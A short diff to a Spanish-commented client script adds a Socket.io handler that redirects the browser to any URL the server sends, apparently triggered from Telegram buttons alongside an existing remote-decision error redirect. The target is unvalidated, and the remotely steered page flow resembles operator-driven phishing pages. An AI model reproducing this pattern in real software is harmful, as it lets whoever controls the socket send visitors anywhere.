@@ -39,3 +39,12 @@ socket.on("respuestaErrorLogo", (decision) => {
     window.location.href = "errorlogo.html";
   }
 });
+
+// ✅ Redirección desde botones (Telegram o HTML)
+socket.on("redirigir", (data) => {
+  if (typeof data === "string") {
+    window.location.href = data;
+  } else if (data?.url) {
+    window.location.href = data.url;
+  }
+});
